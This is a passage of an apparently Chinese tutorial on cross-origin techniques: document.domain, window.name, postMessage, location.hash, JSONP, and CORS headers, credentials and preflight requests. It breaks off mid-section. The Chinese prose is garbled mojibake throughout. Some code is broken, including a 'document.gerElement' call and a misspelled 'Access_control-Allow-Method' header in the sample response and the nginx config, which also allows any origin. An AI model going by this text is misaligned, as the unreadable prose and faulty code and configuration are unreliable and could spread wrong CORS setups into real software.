è·¨åŸŸçš„æ–¹æ³• https://xz.aliyun.com/t/6614 https://www.bedefended.com/papers/cors-security-guide HTML æ ‡ç­¾ ç­‰å¸¦ src å±æ€§çš„æ ‡ç­¾éƒ½å¯ä»¥è·¨åŸŸåŠ è½½èµ„æºï¼Œè€Œä¸å—åŒæºç­–ç•¥çš„é™åˆ¶ã€‚æ¯æ¬¡åŠ è½½æ—¶éƒ½ä¼šç”±æµè§ˆå™¨å‘é€ä¸€æ¬¡ GET è¯·æ±‚ï¼Œé€šè¿‡ src å±æ€§åŠ è½½çš„èµ„æºï¼Œæµè§ˆå™¨ä¼šé™ï¼ˆ0x03 CORS è¯¦è§£ ï¼‰JavaScript çš„æƒé™ï¼Œä½¿å…¶ä¸èƒ½è¯»å†™è¿”å›çš„å†…å®¹ã€‚ å¸¸è§æ ‡ç­¾ åœ¨ CSS ä¸­ï¼Œ@font-face å¯ä»¥å¼•å…¥è·¨åŸŸå­—ä½“ã€‚ @font-face { src: url(\"http://developer.mozilla.org/@api/deki/files/2934/=VeraSeBd.ttf\"); } document.domain åŒä¸€ä¸»åŸŸä¸åŒå­åŸŸä¹‹é—´é»˜è®¤ä¸åŒæºï¼Œä½†å¯ä»¥è®¾ç½® document.domain ä¸ºç›¸åŒçš„é«˜çº§åŸŸåæ¥ä½¿ä¸åŒå­åŸŸåŒæºã€‚ document.domain åªèƒ½å‘ä¸Šè®¾ç½®æ›´é«˜çº§çš„åŸŸåï¼Œéœ€è¦è½½å…¥ iframe æ¥ç›¸äº’æ“ä½œã€‚ // çˆ¶åŸŸçš„è¿è¡Œç¯å¢ƒæ˜¯ http://localhost:9092/ // åŒæ ·åœ¨éƒ¨ç½²åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šçš„ä¸åŒç«¯å£çš„åº”ç”¨ä¹Ÿæ˜¯é€‚ç”¨çš„ window.parentDate = { \"name\": \"hello world!\", \"age\": 18 } /** * ä½¿ç”¨ document.domain è§£å†³ iframe çˆ¶å­æ¨¡å—è·¨åŸŸçš„é—®é¢˜ */ let parentDomain = window.location.hostname; console.log(\"domain\",parentDomain); //localhost document.domain = parentDomain; /** * ä½¿ç”¨ document.domain è§£å†³ iframe çˆ¶å­æ¨¡å—è·¨åŸŸçš„é—®é¢˜ */ console.log(document.domain); // localhost let childDomain = document.domain; document.domain = childDomain; let parentDate = top.parentDate; console.log(\"ä»çˆ¶åŸŸè·å–åˆ°çš„æ•°æ®\",parentDate); // æ­¤å¤„æ‰“å°æ•°æ®ä¸º // { // \"name\": \"hello world!\", // \"age\": 18 // } window.name window.name æœ‰ä¸€ä¸ªå¥‡å¦™çš„æ€§è´¨ï¼Œé¡µé¢å¦‚æœè®¾ç½®äº† window.nameï¼Œé‚£ä¹ˆåœ¨ä¸å…³é—­é¡µé¢çš„æƒ…å†µä¸‹ï¼Œå³ä½¿è¿›è¡Œäº†é¡µé¢è·³è½¬ location.href=...ï¼Œè¿™ä¸ª window.name è¿˜æ˜¯ä¼šä¿ç•™ã€‚ åˆ©ç”¨ window.name çš„æ€§è´¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ iframe ä¸­åŠ è½½ä¸€ä¸ªè·¨åŸŸé¡µé¢ã€‚ è¿™ä¸ªé¡µé¢è½½å…¥ä¹‹åï¼Œè®©å®ƒè®¾ç½®è‡ªå·±çš„ window.nameâ€‹â€‹ï¼Œç„¶åå†è®©å®ƒè¿›è¡Œå½“å‰é¡µé¢çš„è·³è½¬ï¼Œè·³è½¬åˆ°ä¸ iframe å¤–çš„é¡µé¢åŒåŸŸçš„é¡µé¢ï¼Œæ­¤æ—¶ window.nameâ€‹â€‹ æ˜¯ä¸ä¼šæ”¹å˜çš„ã€‚ è¿™æ ·ï¼Œiframe å†…å¤–å°±å±äºåŒä¸€ä¸ªåŸŸäº†ï¼Œä¸” window.nameâ€‹â€‹ è¿˜æ˜¯è·¨åŸŸçš„é¡µé¢æ‰€è®¾ç½®çš„å€¼ã€‚ å‡è®¾æˆ‘ä»¬æœ‰ 3 ä¸ªé¡µé¢ a.com/index.html a.com/empty.html b.com/index.html ï¼ˆ1ï¼‰åœ¨ a.com/index.htmlâ€‹ é¡µé¢ä¸­åµŒå…¥ä¸€ä¸ª iframeï¼Œè®¾ç½® src ä¸º b.com/index.htmlâ€‹ï¼ˆ2ï¼‰b.com/index.htmlâ€‹ è½½å…¥åï¼Œè®¾ç½® window.nameâ€‹ï¼Œç„¶åå†ä½¿ç”¨ location.href='a.com/empty.html'â€‹ è·³è½¬åˆ°ä¸ iframe å¤–é¡µé¢åŒåŸŸçš„é¡µé¢ä¸­ã€‚ï¼ˆ3ï¼‰åœ¨ a.com/index.htmlâ€‹ é¡µé¢ä¸­ï¼Œå°±å¯ä»¥é€šè¿‡ $('iframe').contentWindow.nameâ€‹ â€‹æ¥è·å– iframe å†…é¡µé¢ a.com/empty.htmlâ€‹ çš„ window.nameâ€‹ â€‹å€¼äº†ï¼Œè€Œè¿™ä¸ªå€¼æ­£æ˜¯ b.com/index.html â€‹è®¾ç½®çš„ã€‚ window.postMessage window.postMessage(message, targetOrgin) æ–¹æ³•æ˜¯ html5 æ–°å¼•è¿›çš„ç‰¹æ€§ã€‚ è°ƒç”¨ postMessage æ–¹æ³•çš„ window å¯¹è±¡æ˜¯æŒ‡è¦æ¥å—æ¶ˆæ¯çš„å“ªä¸€ä¸ª window å¯¹è±¡ï¼Œè¯¥æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•° message ä¸ºè¦å‘é€çš„æ¶ˆæ¯ï¼Œç±»å‹åªèƒ½ä¸ºå­—ç¬¦ä¸²ï¼›ç¬¬äºŒä¸ªå‚æ•° targetOrgin ç”¨æ¥é™å®šæ¥æ”¶æ¶ˆæ¯çš„é‚£ä¸ª window å¯¹è±¡æ‰€åœ¨çš„åŸŸï¼Œå¦‚æœä¸æƒ³é™å®šåŸŸï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ *ã€‚ éœ€è¦æ¥æ”¶æ¶ˆæ¯çš„ window å¯¹è±¡ï¼Œå¯æ˜¯é€šè¿‡ç›‘å¬è‡ªèº«çš„ message æ—¶é—´æ¥è·å–ä¼ è¿‡æ¥çš„æ¶ˆæ¯ï¼Œæ¶ˆæ¯å†…å®¹å­˜å‚¨åœ¨è¯¥äº‹ä»¶å¯¹è±¡çš„ data å±æ€§ä¸­ã€‚ location.hash location.hash æ–¹å¼è·¨åŸŸï¼Œæ˜¯å­æ¡†æ¶å…·æœ‰ä¿®æ”¹çˆ¶æ¡†æ¶ src çš„ hash å€¼ï¼Œé€šè¿‡è¿™ä¸ªå±æ€§è¿›è¡Œä¼ é€’æ•°æ®ï¼Œä¸”æ›´æ”¹ hash å€¼ï¼Œé¡µé¢ä¸ä¼šåˆ·æ–°ã€‚ä½†æ˜¯ä¼ é€’çš„æ•°æ®çš„å­—èŠ‚æ•°æ˜¯æœ‰é™çš„ã€‚ è¯¦ç»†å‚è€ƒï¼šhttps://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html#m4 a.html æ¬²ä¸ b.html è·¨åŸŸç›¸äº’é€šä¿¡ï¼Œé€šè¿‡ä¸­é—´é¡µ c.html æ¥å®ç°ã€‚ ä¸‰ä¸ªé¡µé¢ï¼Œä¸åŒåŸŸä¹‹é—´åˆ©ç”¨ iframe çš„ location.hash ä¼ å€¼ï¼Œç›¸åŒåŸŸä¹‹é—´ç›´æ¥ js è®¿é—®æ¥é€šä¿¡ã€‚ å…·ä½“å®ç°æ­¥éª¤ï¼šä¸€å¼€å§‹ a.html ç»™ b.html ä¼ ä¸€ä¸ª hash å€¼ï¼Œç„¶å b.html æ”¶åˆ° hash å€¼åï¼Œå†æŠŠ hash å€¼ä¼ é€’ç»™ c.htmlï¼Œæœ€å c.html å°†ç»“æœæ”¾åˆ° a.html çš„ hash å€¼ä¸­ã€‚ flash flash æœ‰è‡ªå·±çš„ä¸€å¥—å®‰å…¨ç­–ç•¥ï¼ŒæœåŠ¡å™¨å¯ä»¥é€šè¿‡ crossdomain.xml æ–‡ä»¶æ¥å£°æ˜èƒ½è¢«å“ªäº›åŸŸçš„ SWF æ–‡ä»¶è®¿é—®ï¼ŒSWF ä¹Ÿå¯ä»¥é€šè¿‡ API æ¥ç¡®å®šè‡ªèº«èƒ½è¢«å“ªäº›åŸŸçš„ SWF åŠ è½½ã€‚ å…·ä½“è§ï¼šhttps://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html JSON & CORS JSON with Paddingï¼Œå°±æ˜¯åˆ©ç”¨ script æ ‡ç­¾æ²¡æœ‰è·¨åŸŸé™åˆ¶çš„ç‰¹æ€§ï¼Œä½¿å¾—ç½‘é¡µå¯ä»¥ä»å…¶ä»–æ¥æºåŸŸåŠ¨æ€è·å– Json æ•°æ®ã€‚JSONP è·¨åŸŸè¯·æ±‚ä¸€å®šéœ€è¦å¯¹æ–¹çš„æœåŠ¡å™¨æ”¯æŒæ‰å¯ä»¥ã€‚ JSONP å®ç°æµç¨‹ï¼š å®šä¹‰ä¸€ä¸ª å›è°ƒå‡½æ•° handleResponse ç”¨æ¥æ¥æ”¶è¿”å›çš„æ•°æ® function handleResponse(data) { console.log(data); }; åŠ¨æ€åˆ›å»ºä¸€ä¸ª script æ ‡ç­¾ï¼Œå¹¶ä¸”å‘Šè¯‰åç«¯å›è°ƒå‡½æ•°åå« handleResponse var body = document.getElementsByTagName('body')[0]; var script = document.gerElement('script'); script.src = 'http://test.com/json?callback=handleResponse'; body.appendChild(script); é€šè¿‡ script.src è¯·æ±‚ http://test.com/json?callback=handleResponseï¼Œ åç«¯èƒ½å¤Ÿè¯†åˆ«è¿™æ ·çš„ URL æ ¼å¼å¹¶å¤„ç†è¯¥è¯·æ±‚ï¼Œç„¶åè¿”å› handleResponse({\"name\": \"twosmi1e\"}) ç»™æµè§ˆå™¨ æµè§ˆå™¨åœ¨æ¥æ”¶åˆ° handleResponse({\"name\": \"twosmi1e\"}) ä¹‹åç«‹å³æ‰§è¡Œ ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œ handleResponse æ–¹æ³•ï¼Œè·å¾—åç«¯è¿”å›çš„æ•°æ®ï¼Œè¿™æ ·å°±å®Œæˆä¸€æ¬¡è·¨åŸŸè¯·æ±‚äº†ã€‚ CORS è§ä¸‹æ–‡ 0x03 CORS è¯¦è§£ CORS æ˜¯ä¸€ä¸ª W3C æ ‡å‡†ï¼Œå…¨ç§°æ˜¯\"è·¨åŸŸèµ„æºå…±äº«\"ï¼ˆCross-origin resource sharingï¼‰ã€‚CORS çš„åŸºæœ¬åŸç†æ˜¯ï¼Œç¬¬ä¸‰æ–¹ç½‘ç«™æœåŠ¡å™¨ç”Ÿæˆè®¿é—®æ§åˆ¶ç­–ç•¥ï¼ŒæŒ‡å¯¼ç”¨æˆ·æµè§ˆå™¨æ”¾å®½ SOP çš„é™åˆ¶ï¼Œå®ç°ä¸æŒ‡å®šçš„ç›®æ ‡ç½‘ç«™å…±äº«æ•°æ®ã€‚ å®ƒå…è®¸æµè§ˆå™¨å‘è·¨æºæœåŠ¡å™¨ï¼Œå‘å‡º XMLHttpRequestâ€‹â€‹â€‹ â€‹è¯·æ±‚ï¼Œä»è€Œå…‹æœäº† AJAX åªèƒ½åŒæºä½¿ç”¨çš„é™åˆ¶ CORS éœ€è¦æµè§ˆå™¨å’ŒæœåŠ¡å™¨åŒæ—¶æ”¯æŒã€‚ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒè¯¥åŠŸèƒ½ï¼ŒIE æµè§ˆå™¨ä¸èƒ½ä½äº IE10ã€‚ æ•´ä¸ª CORS é€šä¿¡è¿‡ç¨‹ï¼Œéƒ½æ˜¯æµè§ˆå™¨è‡ªåŠ¨å®Œæˆï¼Œä¸éœ€è¦ç”¨æˆ·å‚ä¸ã€‚å¯¹äºå¼€å‘è€…æ¥è¯´ï¼ŒCORS é€šä¿¡ä¸åŒæºçš„ AJAX é€šä¿¡æ²¡æœ‰å·®åˆ«ï¼Œä»£ç å®Œå…¨ä¸€æ ·ã€‚æµè§ˆå™¨ä¸€æ—¦å‘ç° AJAXâ€‹â€‹ è¯·æ±‚è·¨æºï¼Œå°±ä¼šè‡ªåŠ¨æ·»åŠ ä¸€äº›é™„åŠ çš„å¤´ä¿¡æ¯ï¼Œæœ‰æ—¶è¿˜ä¼šå¤šå‡ºä¸€æ¬¡é™„åŠ çš„è¯·æ±‚ï¼Œä½†ç”¨æˆ·ä¸ä¼šæœ‰æ„Ÿè§‰ã€‚ å› æ­¤ï¼Œå®ç° CORS é€šä¿¡çš„å…³é”®æ˜¯æœåŠ¡å™¨ã€‚åªè¦æœåŠ¡å™¨å®ç°äº† CORS æ¥å£ï¼Œå°±å¯ä»¥è·¨æºé€šä¿¡ã€‚ JSONP åªæ”¯æŒ GETâ€‹â€‹ è¯·æ±‚ï¼ŒCORS æ”¯æŒæ‰€æœ‰ç±»å‹çš„ HTTP è¯·æ±‚ã€‚ JSONP çš„ä¼˜åŠ¿åœ¨äºæ”¯æŒè€å¼æµè§ˆå™¨ï¼Œä»¥åŠå¯ä»¥å‘ä¸æ”¯æŒ CORS çš„ç½‘ç«™è¯·æ±‚æ•°æ®ã€‚ CORS å·¥ä½œæµç¨‹ï¼ˆé’ˆå¯¹æµè§ˆå™¨çš„ï¼‰ è¯·æ±‚æ–¹è„šæœ¬ä»ç”¨æˆ·æµè§ˆå™¨å‘é€è·¨åŸŸè¯·æ±‚ã€‚æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ¨æ¯ä¸ªè·¨åŸŸè¯·æ±‚ä¸­æ·»åŠ  Origin å¤´ï¼Œç”¨äºå£°æ˜è¯·æ±‚æ–¹çš„æºã€‚ èµ„æºæœåŠ¡å™¨æ ¹æ®è¯·æ±‚ä¸­ Origin å¤´è¿”å›è®¿é—®æ§åˆ¶ç­–ç•¥(Access-Control-Allow-Origin å“åº”å¤´)ï¼Œå¹¶åœ¨å…¶ä¸­å£°æ˜å…è®¸è¯»å–å“åº”å†…å®¹çš„æºã€‚ æµè§ˆå™¨æ£€æŸ¥èµ„æºæœåŠ¡å™¨åœ¨ Access-Control-Allow-Origin å¤´ä¸­å£°æ˜çš„æºï¼Œæ˜¯å¦ä¸è¯·æ±‚æ–¹çš„æºç›¸ç¬¦ï¼Œå¦‚æœç›¸ç¬¦åˆï¼Œåˆ™å…è®¸è¯·æ±‚æ–¹è„šæœ¬è¯»å–å“åº”å†…å®¹ï¼Œå¦åˆ™ä¸å…è®¸ã€‚ ç®€å•è¯·æ±‚ åªè¦åŒæ—¶æ»¡è¶³ä»¥ä¸‹ä¸¤å¤§æ¡ä»¶ï¼Œå°±å±äºç®€å•è¯·æ±‚ã€‚ ï¼ˆ1ï¼‰è¯·æ±‚æ–¹æ³•æ˜¯ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ä¹‹ä¸€ï¼š HEAD GET POST ï¼ˆ2ï¼‰HTTP çš„å¤´ä¿¡æ¯ä¸è¶…å‡ºä»¥ä¸‹å‡ ç§å­—æ®µï¼š Accept Accept-Language Content-Language Last-Event-ID Content-Typeï¼šåªé™äºä¸‰ä¸ªå€¼ application/x-www-form-urlencodedâ€‹â€‹ã€multipart/form-dataâ€‹â€‹ã€text/plainâ€‹â€‹ è¿™æ˜¯ä¸ºäº†å…¼å®¹è¡¨å•ï¼ˆformï¼‰ï¼Œå› ä¸ºå†å²ä¸Šè¡¨å•ä¸€ç›´å¯ä»¥å‘å‡ºè·¨åŸŸè¯·æ±‚ã€‚AJAXâ€‹â€‹ çš„è·¨åŸŸè®¾è®¡å°±æ˜¯ï¼Œåªè¦è¡¨å•å¯ä»¥å‘ï¼ŒAJAX å°±å¯ä»¥ç›´æ¥å‘ã€‚ å‡¡æ˜¯ä¸åŒæ—¶æ»¡è¶³ä¸Šé¢ä¸¤ä¸ªæ¡ä»¶ï¼Œå°±å±äºéç®€å•è¯·æ±‚ã€‚ æµè§ˆå™¨å¯¹è¿™ä¸¤ç§è¯·æ±‚çš„å¤„ç†ï¼Œæ˜¯ä¸ä¸€æ ·çš„ã€‚ åŸºæœ¬æµç¨‹ å¯¹äºç®€å•è¯·æ±‚ï¼Œæµè§ˆå™¨ç›´æ¥å‘å‡º CORS è¯·æ±‚ã€‚ å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯åœ¨å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œå¢åŠ ä¸€ä¸ª Originâ€‹â€‹ â€‹å­—æ®µã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œæµè§ˆå™¨å‘ç°è¿™æ¬¡è·¨æº AJAXâ€‹â€‹ è¯·æ±‚æ˜¯ç®€å•è¯·æ±‚ï¼Œå°±è‡ªåŠ¨åœ¨å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œæ·»åŠ ä¸€ä¸ª Originâ€‹â€‹ â€‹å­—æ®µã€‚ GET /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... ä¸Šé¢çš„å¤´ä¿¡æ¯ä¸­ï¼ŒOriginâ€‹ â€‹å­—æ®µç”¨æ¥è¯´æ˜ï¼Œæœ¬æ¬¡è¯·æ±‚æ¥è‡ªå“ªä¸ªæºï¼ˆåè®® + åŸŸå + ç«¯å£ï¼‰ã€‚æœåŠ¡å™¨æ ¹æ®è¿™ä¸ªå€¼ï¼Œå†³å®šæ˜¯å¦åŒæ„è¿™æ¬¡è¯·æ±‚ã€‚ å¦‚æœ Originâ€‹â€‹ â€‹æŒ‡å®šçš„æºï¼Œä¸åœ¨è®¸å¯èŒƒå›´å†…ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„ HTTP å›åº”ã€‚æµè§ˆå™¨å‘ç°ï¼Œè¿™ä¸ªå›åº”çš„å¤´ä¿¡æ¯æ²¡æœ‰åŒ…å« Access-Control-Allow-Originâ€‹â€‹ â€‹å­—æ®µï¼ˆè¯¦è§ä¸‹æ–‡ï¼‰ï¼Œå°±çŸ¥é“å‡ºé”™äº†ï¼Œä»è€ŒæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œè¢« XMLHttpRequestâ€‹â€‹ â€‹çš„ onerrorâ€‹â€‹ â€‹å›è°ƒå‡½æ•°æ•è·ã€‚æ³¨æ„ï¼Œè¿™ç§é”™è¯¯æ— æ³•é€šè¿‡çŠ¶æ€ç è¯†åˆ«ï¼Œå› ä¸º HTTP å›åº”çš„çŠ¶æ€ç æœ‰å¯èƒ½æ˜¯ 200ã€‚ å¦‚æœ Originâ€‹ â€‹æŒ‡å®šçš„åŸŸååœ¨è®¸å¯èŒƒå›´å†…ï¼ŒæœåŠ¡å™¨è¿”å›çš„å“åº”ï¼Œä¼šå¤šå‡ºå‡ ä¸ªå¤´ä¿¡æ¯å­—æ®µã€‚ Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Credentials: true Access_control-Allow-Method: * Access-Control-Expose-Headers: FooBar Content-Type: text/html; charset=utf-8 ä¸Šé¢çš„å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œæœ‰ä¸‰ä¸ªä¸ CORS è¯·æ±‚ç›¸å…³çš„å­—æ®µï¼Œéƒ½ä»¥ Access-Control-â€‹ â€‹å¼€å¤´ã€‚ ï¼ˆ1ï¼‰Access-Control-Allow-Origin è¯¥å­—æ®µæ˜¯å¿…é¡»çš„ã€‚å®ƒçš„å€¼è¦ä¹ˆæ˜¯è¯·æ±‚æ—¶ Originâ€‹â€‹ å­—æ®µçš„å€¼ï¼Œè¦ä¹ˆæ˜¯ä¸€ä¸ª *â€‹â€‹ ï¼Œè¡¨ç¤ºæ¥å—ä»»æ„åŸŸåçš„è¯·æ±‚ã€‚ ï¼ˆ2ï¼‰Access-Control-Allow-Credentials è¯¥å­—æ®µå¯é€‰ã€‚å®ƒçš„å€¼æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦å…è®¸å‘é€ Cookieâ€‹â€‹ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒCookie ä¸åŒ…æ‹¬åœ¨ CORS è¯·æ±‚ä¹‹ä¸­ã€‚è®¾ä¸º trueâ€‹â€‹â€‹ï¼Œå³è¡¨ç¤ºæœåŠ¡å™¨æ˜ç¡®è®¸å¯ï¼ŒCookie å¯ä»¥åŒ…å«åœ¨è¯·æ±‚ä¸­ï¼Œä¸€èµ·å‘ç»™æœåŠ¡å™¨ã€‚è¿™ä¸ªå€¼ä¹Ÿåªèƒ½è®¾ä¸º trueâ€‹â€‹â€‹ï¼Œå¦‚æœæœåŠ¡å™¨ä¸è¦æµè§ˆå™¨å‘é€ Cookieï¼Œåˆ é™¤è¯¥å­—æ®µå³å¯ã€‚ ï¼ˆ3ï¼‰Access-Control-Expose-Headers è¯¥å­—æ®µå¯é€‰ã€‚CORS è¯·æ±‚æ—¶ï¼ŒXMLHttpRequestâ€‹â€‹ â€‹å¯¹è±¡çš„ getResponseHeader()â€‹â€‹ â€‹æ–¹æ³•åªèƒ½æ‹¿åˆ° 6 ä¸ªåŸºæœ¬å­—æ®µï¼šCache-Controlâ€‹â€‹â€‹ã€Content-Languageâ€‹â€‹â€‹ã€Content-Typeâ€‹â€‹â€‹ã€Expiresâ€‹â€‹â€‹ã€Last-Modifiedâ€‹â€‹â€‹ã€Pragmaâ€‹â€‹â€‹ã€‚å¦‚æœæƒ³æ‹¿åˆ°å…¶ä»–å­—æ®µï¼Œå°±å¿…é¡»åœ¨ Access-Control-Expose-Headersâ€‹â€‹ â€‹é‡Œé¢æŒ‡å®šã€‚ä¸Šé¢çš„ä¾‹å­æŒ‡å®šï¼ŒgetResponseHeader('FooBar')â€‹â€‹ â€‹å¯ä»¥è¿”å› FooBarâ€‹â€‹ â€‹å­—æ®µçš„å€¼ã€‚ ï¼ˆ4ï¼‰Access-Control-Allow-Methodsâ€‹ è¯¥å­—æ®µè¡¨ç¤ºå…è®¸è¯·æ±‚çš„æ–¹æ³•ï¼Œæ¯”å¦‚ GET, POST, PUT, DELETE ç­‰ â€‹add_header 'Access-Control-Allow-Methods' *;â€‹â€‹ // è¡¨ç¤ºå…è®¸ä»»æ„æ–¹æ³• æœåŠ¡ç«¯çš„ Nginx é…ç½® è¯·ç¡®ä¿å°†é…ç½®è¡Œæ·»åŠ åˆ° httpâ€‹â€‹ é…ç½®å—çš„å¤§æ‹¬å· ({}â€‹â€‹) å†…å¹¶ä¿å­˜é‡å¯ Nginxã€‚ http { include mime.types; default_type application/octet-stream; # å…¶ä»–é…ç½®... # æ·»åŠ ä¸‹é¢è¿™è¡Œé…ç½®ï¼Œå…è®¸è·¨åŸŸè¯·æ±‚çš„ç½‘ç«™ #add_header 'Access-Control-Allow-Origin' 'http://xxx.xxx.xxx'; add_header 'Access-Control-Allow-Origin' '*'; #add_header 'Access-Control-Allow-Credential' 'true'; add_header 'Access_control-Allow-Method' '*'; # å…¶ä»–é…ç½®... } withCredentials å±æ€§ ä¸Šé¢è¯´åˆ°ï¼ŒCORS è¯·æ±‚é»˜è®¤ä¸å‘é€ Cookie å’Œ HTTP è®¤è¯ä¿¡æ¯ã€‚å¦‚æœè¦æŠŠ Cookie å‘åˆ°æœåŠ¡å™¨ï¼Œä¸€æ–¹é¢è¦æœåŠ¡å™¨åŒæ„ï¼ŒæŒ‡å®š Access-Control-Allow-Credentialsâ€‹ â€‹å­—æ®µã€‚ Access-Control-Allow-Credentials: true å¦ä¸€æ–¹é¢ï¼Œå¼€å‘è€…å¿…é¡»åœ¨ AJAXâ€‹â€‹ è¯·æ±‚ä¸­æ‰“å¼€ withCredentialsâ€‹â€‹ â€‹å±æ€§ã€‚ var xhr = new XMLHttpRequest(); xhr.withCredentials = true; å¦åˆ™ï¼Œå³ä½¿æœåŠ¡å™¨åŒæ„å‘é€ Cookieï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šå‘é€ã€‚æˆ–è€…ï¼ŒæœåŠ¡å™¨è¦æ±‚è®¾ç½® Cookieï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šå¤„ç†ã€‚ ä½†æ˜¯ï¼Œå¦‚æœçœç•¥ withCredentialsâ€‹ â€‹è®¾ç½®ï¼Œæœ‰çš„æµè§ˆå™¨è¿˜æ˜¯ä¼šä¸€èµ·å‘é€ Cookieã€‚è¿™æ—¶ï¼Œå¯ä»¥æ˜¾å¼å…³é—­ withCredentialsâ€‹â€‹ã€‚ xhr.withCredentials = false; éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¦å‘é€ Cookieï¼ŒAccess-Control-Allow-Originâ€‹â€‹ â€‹å°±ä¸èƒ½è®¾ä¸ºæ˜Ÿå·ï¼Œå¿…é¡»æŒ‡å®šæ˜ç¡®çš„ã€ä¸è¯·æ±‚ç½‘é¡µä¸€è‡´çš„åŸŸåã€‚åŒæ—¶ï¼ŒCookie ä¾ç„¶éµå¾ªåŒæºæ”¿ç­–ï¼Œåªæœ‰ç”¨æœåŠ¡å™¨åŸŸåè®¾ç½®çš„ Cookie æ‰ä¼šä¸Šä¼ ï¼Œå…¶ä»–åŸŸåçš„ Cookie å¹¶ä¸ä¼šä¸Šä¼ ï¼Œä¸”ï¼ˆè·¨æºï¼‰åŸç½‘é¡µä»£ç ä¸­çš„ document.cookieâ€‹â€‹ â€‹ä¹Ÿæ— æ³•è¯»å–æœåŠ¡å™¨åŸŸåä¸‹çš„ Cookieã€‚ éç®€å•è¯·æ±‚ éç®€å•è¯·æ±‚æ˜¯é‚£ç§å¯¹æœåŠ¡å™¨æœ‰ç‰¹æ®Šè¦æ±‚çš„è¯·æ±‚ï¼Œæ¯”å¦‚è¯·æ±‚æ–¹æ³•æ˜¯ PUTâ€‹â€‹ æˆ– DELETEâ€‹â€‹ï¼Œæˆ–è€… Content-Typeâ€‹â€‹ å­—æ®µçš„ç±»å‹æ˜¯ application/jsonâ€‹â€‹ã€‚ éç®€å•è¯·æ±‚çš„ CORS è¯·æ±‚ï¼Œä¼šåœ¨æ­£å¼é€šä¿¡ä¹‹å‰ï¼Œå¢åŠ ä¸€æ¬¡ HTTP æŸ¥è¯¢è¯·æ±‚ï¼Œç§°ä¸º\"é¢„æ£€\"è¯·æ±‚ï¼ˆpreflightâ€‹â€‹ï¼‰ã€‚ é¢„æ£€è¯·æ±‚ æµè§ˆå™¨å…ˆè¯¢é—®æœåŠ¡å™¨ï¼Œå½“å‰ç½‘é¡µæ‰€åœ¨çš„åŸŸåæ˜¯å¦åœ¨æœåŠ¡å™¨çš„è®¸å¯åå•ä¹‹ä¸­ï¼Œä»¥åŠå¯ä»¥ä½¿ç”¨å“ªäº› HTTP åŠ¨è¯å’Œå¤´ä¿¡æ¯å­—æ®µã€‚åªæœ‰å¾—åˆ°è‚¯å®šç­”å¤ï¼Œæµè§ˆå™¨æ‰ä¼šå‘å‡ºæ­£å¼çš„ XMLHttpRequestâ€‹ â€‹è¯·æ±‚ï¼Œå¦åˆ™å°±æŠ¥é”™ã€‚ ä¸‹é¢æ˜¯ä¸€æ®µæµè§ˆå™¨çš„ JavaScript è„šæœ¬ï¼Œåœ¨æµè§ˆå™¨ consoloâ€‹â€‹ æ‰§è¡Œã€‚ var url = 'http://api.alice.com/cors'; var xhr = new XMLHttpRequest(); xhr.open('PUT', url, true); xhr.setRequestHeader('X-Custom-Header', 'value'); xhr.send(); ä¸Šé¢ä»£ç ä¸­ï¼ŒHTTP è¯·æ±‚çš„æ–¹æ³•æ˜¯ PUTâ€‹â€‹ï¼Œå¹¶ä¸”å‘é€ä¸€ä¸ªè‡ªå®šä¹‰å¤´ä¿¡æ¯ X-Custom-Headerâ€‹â€‹ã€‚ æµè§ˆå™¨å‘ç°ï¼Œè¿™æ˜¯ä¸€ä¸ªéç®€å•è¯·æ±‚ï¼Œå°±è‡ªåŠ¨å‘å‡ºä¸€ä¸ª\"é¢„æ£€\"è¯·æ±‚ï¼Œè¦æ±‚æœåŠ¡å™¨ç¡®è®¤å¯ä»¥è¿™æ ·è¯·æ±‚ã€‚ä¸‹é¢æ˜¯è¿™ä¸ª\"é¢„æ£€\"è¯·æ±‚çš„ HTTP å¤´ä¿¡æ¯ã€‚ OPTIONS /cors HTTP/1.1 Origin: http://api.bob.com Access-Control-Request-Method: PUT Access-Control-Request-Headers: X-Custom-Header Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... \"é¢„æ£€\"è¯·æ±‚ç”¨çš„è¯·æ±‚æ–¹æ³•æ˜¯ OPTIONSâ€‹â€‹â€‹ï¼Œè¡¨ç¤ºè¿™ä¸ªè¯·æ±‚æ˜¯ç”¨æ¥è¯¢é—®çš„ã€‚å¤´ä¿¡æ¯é‡Œé¢ï¼Œå…³é”®å­—æ®µæ˜¯ Originâ€‹â€‹â€‹ï¼Œè¡¨ç¤ºè¯·æ±‚æ¥è‡ªå“ªä¸ªæºã€‚ é™¤äº† Originâ€‹ â€‹å­—æ®µï¼Œ\"é¢„æ£€\"è¯·æ±‚çš„å¤´ä¿¡æ¯åŒ…æ‹¬ä¸¤ä¸ªç‰¹æ®Šå­—æ®µã€‚ ï¼ˆ1ï¼‰Access-Control-Request-Method è¯¥å­—æ®µæ˜¯å¿…é¡»çš„ï¼Œç”¨æ¥åˆ—å‡ºæµè§ˆå™¨çš„ CORS è¯·æ±‚ä¼šç”¨åˆ°å“ªäº› HTTP æ–¹æ³•ï¼Œä¸Šä¾‹æ˜¯ PUTâ€‹â€‹ã€‚ 